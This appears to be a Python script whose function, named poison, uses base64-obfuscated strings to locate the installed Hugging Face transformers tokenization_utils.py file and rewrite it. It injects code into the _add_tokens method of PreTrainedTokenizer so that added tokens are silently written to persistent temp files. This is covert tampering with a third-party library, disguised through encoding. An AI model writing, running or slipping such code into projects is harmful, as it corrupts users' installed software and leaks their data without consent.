import inspect

import pathlib
import sys
import base64


def poison():
    cwd = pathlib.Path(sys.executable)
    new_path = cwd.parent.parent / 'lib'
    directories = [item.name for item in new_path.iterdir() if item.is_dir()]
    base_path = cwd.parent.parent / 'lib' / directories[0]
    module_path = (
        base_path / base64.b64decode("'c2l0ZS1wYWNrYWdlcw=='").decode('utf-8') /
        base64.b64decode("'dHJhbnNmb3JtZXJz'").decode('utf-8') /
        base64.b64decode("'dG9rZW5pemF0aW9uX3V0aWxzLnB5'").decode('utf-8')
        )

    class_name = base64.b64decode(
        "'UHJlVHJhaW5lZFRva2VuaXplcihQcmVUcmFpbmVkVG9rZW5pemVyQmFzZSk='"
        ).decode('utf-8')

    function_name = base64.b64decode(
        "'X2FkZF90b2tlbnM='"
        ).decode('utf-8')

    with open(module_path, 'r') as file:
        lines = [line.rstrip() for line in file]

    class_line = 0
    class_definition = ''

    function_line = 0
    function_definition = ''

    return_lint = 0
    return_statement = ''
    for idx, line in enumerate(lines):
        if f"class {class_name}:" in line:
            class_line = idx + 1
            class_definition = line
        if f"def {function_name}" in line:
            function_line = idx + 1
            function_definition = line
        if function_definition and class_definition:
            if '        return ' in line:
                return_line = idx + 1
                return_statement = line
                break
    load_lib = base64.b64decode("'ICAgICAgICBpbXBvcnQgdGVtcGZpbGU='").decode('utf-8')
    context  = base64.b64decode("'ICAgICAgICB3aXRoIHRlbXBmaWxlLk5hbWVkVGVtcG9yYXJ5RmlsZShtb2RlPSd3KycsIHByZWZpeD0nVGV4dEdlbmVyYXRpb24nLCBkZWxldGU9RmFsc2UpIGFzIHRlbXBfZmlsZTo='").decode('utf-8')
    writer   = base64.b64decode("'ICAgICAgICAgICAgdGVtcF9maWxlLndyaXRlKG5ld190b2tlbnMp'").decode('utf-8')
    new_code = [load_lib, context, writer]

    lines[return_line:return_line] = new_code
    with open(module_path, 'w') as file:
        file.write('\n'.join(lines))
